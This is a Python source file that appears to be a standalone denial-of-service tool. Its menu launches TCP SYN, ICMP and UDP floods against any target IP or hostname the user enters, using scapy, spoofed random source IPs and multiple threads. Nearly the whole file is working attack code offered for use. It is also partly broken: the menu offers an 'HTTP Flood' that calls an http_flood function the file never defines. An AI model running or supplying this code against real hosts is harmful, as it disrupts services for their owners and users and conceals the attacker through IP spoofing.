from logging import Formatter, StreamHandler, INFO, WARNING, ERROR, CRITICAL, basicConfig, addLevelName, getLogger
from aiohttp import TCPConnector, ClientTimeout, ClientSession, ClientError
from asyncio import gather, run, TimeoutError
from socket import gethostbyname, gaierror
from threading import Thread, Event, Lock
from os import system, urandom, name
from fake_useragent import UserAgent
from urllib.parse import urlparse
from sys import exit as _exit
from time import sleep, time
from random import randint

# Check for root
if not ((name == 'nt' and __import__('ctypes').windll.shell32.IsUserAnAdmin() != 0) or (name != 'nt' and __import__('os').geteuid() == 0)):
    _exit("This script must be run with root privileges!")

# Import scapy
from scapy.all import send, IP, TCP, UDP, ICMP, Raw, logging as scapy_logging

# Suppress scapy warnings
scapy_logging.getLogger("scapy.runtime").setLevel(scapy_logging.ERROR)

# Add the new logging level to the logging module
SUCCESS = INFO + 5
addLevelName(SUCCESS, "SUCCESS")

# Configure logging
basicConfig(level = INFO, format = '%(message)s')
logger = getLogger()

class CustomFormatter(Formatter):
    FORMATS = {
        INFO: "\033[1;91m[\033[0m\033[1;96m%(asctime)s \033[0m\033[1;91m- \033[0m\033[1;96m%(levelname)s\033[0m\033[1;91m]\033[0m %(message)s\033[0m",
        WARNING: "\n\033[1;91m[\033[0m\033[1;93m%(asctime)s \033[0m\033[1;91m- \033[0m\033[1;93m%(levelname)s\033[0m\033[1;91m]\033[0m %(message)s\033[0m\n",
        ERROR: "\033[1;91m[%(asctime)s - %(levelname)s] %(message)s\033[0m",
        CRITICAL: "\033[1;91m[%(asctime)s - %(levelname)s] %(message)s\033[0m",
        SUCCESS: "\033[1;91m[\033[0m\033[1;92m%(asctime)s \033[0m\033[1;91m- \033[0m\033[1;92m%(levelname)s\033[0m\033[1;91m]\033[0m %(message)s\033[0m"
    }

    def format(self, record):
        log_fmt = self.FORMATS.get(record.levelno)
        formatter = Formatter(log_fmt, datefmt = "%H:%M:%S")
        return formatter.format(record)

handler = StreamHandler()
handler.setFormatter(CustomFormatter())
logger.handlers = [handler]

# Global variables
total_sent = 0
source_ips = set()
port_lock = Lock()
stop_event = Event()
user_agent = UserAgent()

def RS_project_banner():
    system('cls' if name == 'nt' else 'clear')
    print("""
    ██████   █████           █████        █████████   █████               ███  █████
    ░░██████ ░░███           ░░███        ███░░░░░███ ░░███               ░░░  ░░███
    ░███░███ ░███   ██████  ███████     ░███    ░░░  ███████   ████████  ████  ░███ █████  ██████
    ░███░░███░███  ███░░███░░░███░      ░░█████████ ░░░███░   ░░███░░███░░███  ░███░░███  ███░░███
    ░███ ░░██████ ░███████   ░███        ░░░░░░░░███  ░███     ░███ ░░░  ░███  ░██████░  ░███████
    ░███  ░░█████ ░███░░░    ░███ ███    ███    ░███  ░███ ███ ░███      ░███  ░███░░███ ░███░░░
    █████  ░░█████░░██████   ░░█████    ░░█████████   ░░█████  █████     █████ ████ █████░░██████
    ░░░░░    ░░░░░  ░░░░░░     ░░░░░      ░░░░░░░░░     ░░░░░  ░░░░░     ░░░░░ ░░░░ ░░░░░  ░░░░░░

             U         (˶ᵔ ᵕ ᵔ˶)
             ---------------U-U----------------
             |                        |       |‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾|
             |  Code Author: isPique   |       | GitHub: https://github.com/isPique |
             |      Version: 1.0        |       | Insta: https://instagram.com/omrefarukk |
             |                        |       |_____________________________________|
             ----------------------                        (˶ᵔ ᵕ ᵔ˶)/
                                                                  /
    """)

def tcp_syn_flood(destination_ip, packet_size, thread_num):
    global total_sent
    port = 1
    while not stop_event.is_set():
        with port_lock:
            port = (port + 1) % 65535 or 1
        payload = urandom(packet_size)
        source_ip = ".".join(map(str, (randint(0, 255) for _ in range(4))))  # IP Spoofing
        packet = IP(src = source_ip, dst = destination_ip) / TCP(dport = port, flags = 'S') / Raw(load = payload) # SYN flag
        send(packet, verbose = False)  # Response: SYN/ACK
        total_sent += packet_size
        source_ips.add(source_ip)
        logger.info(f"[THREAD {thread_num}] ➡ {packet_size} bytes sent to {destination_ip} through port {port} from {source_ip}")

def icmp_flood(destination_ip, packet_size, thread_num):
    global total_sent
    while not stop_event.is_set():
        payload = urandom(packet_size)
        source_ip = ".".join(map(str, (randint(0, 255) for _ in range(4))))
        packet = IP(src = source_ip, dst = destination_ip) / ICMP() / Raw(load = payload)
        send(packet, verbose = False)
        total_sent += packet_size
        source_ips.add(source_ip)
        logger.info(f"[THREAD {thread_num}] ➡ {packet_size} bytes sent to {destination_ip} from {source_ip}")

def udp_flood(destination_ip, packet_size, thread_num):
    global total_sent
    port = 1
    while not stop_event.is_set():
        with port_lock:
            port = (port + 1) % 65535 or 1
        payload = urandom(packet_size)
        source_ip = ".".join(map(str, (randint(0, 255) for _ in range(4))))
        packet = IP(src = source_ip, dst = destination_ip) / UDP(dport = port) / Raw(load = payload)
        send(packet, verbose = False)
        total_sent += packet_size
        source_ips.add(source_ip)
        logger.info(f"[THREAD {thread_num}] ➡ {packet_size} bytes sent to {destination_ip} through port {port} from {source_ip}")

# Add the same for HTTP flood if needed

def stop_attack(threads):
    stop_event.set()
    logger.warning("Waiting for all threads to shut down...")
    for thread in threads:
        thread.join()
    logger.log(SUCCESS, f"Attack completed. A total of {convert_bytes(total_sent)} data was sent across {len(source_ips)} unique IPs in {duration} seconds.")

def validate_attack_type(choice):
    return choice if choice in ['1', '2', '3', '4', '5'] else logger.error("Please select one of the attack types above. (1, 2, 3...)") or _exit(1)

def validate_ip(ip):
    try:
        return gethostbyname(ip)
    except gaierror:
        logger.error("Invalid IP address or hostname.") or _exit(1)

def validate_packet_size(size):
    return int(size) if size.isdigit() and 1 <= int(size) <= 65495 else logger.error("Invalid packet size. Choose a size between 1 and 65495") or _exit(1)

def validate_thread_count(count):
    return int(count) if count.isdigit() and int(count) > 0 else logger.error("Please enter a positive integer for thread count.") or _exit(1)

def validate_duration(duration):
    return int(duration) if duration.isdigit() and int(duration) > 0 else logger.error("Duration must be a positive integer.") or _exit(1)

def convert_bytes(num):
    for unit in ["Bytes", "KB", "MB", "GB", "TB"]:
        if num < 1024:
            return f"{num:.2f} {unit}"
        num /= 1024

def main():
    global total_sent
    global duration
    attack_types = {
        '1': {'func': tcp_syn_flood, 'proto': 'TCP SYN'},
        '2': {'func': icmp_flood, 'proto': 'ICMP'},
        '3': {'func': udp_flood, 'proto': 'UDP'},
        '4': {'func': http_flood, 'proto': 'HTTP'}
    }

    try:
        RS_project_banner()

        print("----- Attack Types -----")
        print("1. TCP SYN Flood")
        print("2. ICMP Flood")
        print("3. UDP Flood")
        print("4. HTTP Flood")
        print("5. Exit")

        attack_type = validate_attack_type(input("Select Attack Type: ").strip())
        target_ip = validate_ip(input("Enter Target IP or Hostname: ").strip())
        packet_size = validate_packet_size(input("Enter Packet Size: ").strip())
        thread_count = validate_thread_count(input("Enter Thread Count: ").strip())
        duration = validate_duration(input("Enter Attack Duration (in seconds): ").strip())

        attack_details = attack_types.get(attack_type)

        logger.info(f"Attack Details: \n- Attack Type: {attack_details['proto']} \n- Target: {target_ip} \n- Packet Size: {packet_size} bytes \n- Duration: {duration} seconds \n- Threads: {thread_count}")

        # Start threads for the attack
        threads = []
        for i in range(thread_count):
            if attack_type == '1':
                thread = Thread(target=tcp_syn_flood, args=(target_ip, packet_size, i + 1))
            elif attack_type == '2':
                thread = Thread(target=icmp_flood, args=(target_ip, packet_size, i + 1))
            elif attack_type == '3':
                thread = Thread(target=udp_flood, args=(target_ip, packet_size, i + 1))
            elif attack_type == '4':
                thread = Thread(target=http_flood, args=(target_ip, packet_size, i + 1))  # Implement HTTP Flood if needed

            thread.start()
            threads.append(thread)

        # Wait for the attack to run for the specified duration
        sleep(duration)
        stop_attack(threads)

    except KeyboardInterrupt:
        logger.warning("Attack interrupted. Shutting down...")
        stop_attack(threads)
    except Exception as e:
        logger.error(f"An error occurred: {e}")
        _exit(1)

# Run the main function
if __name__ == "__main__":
    main()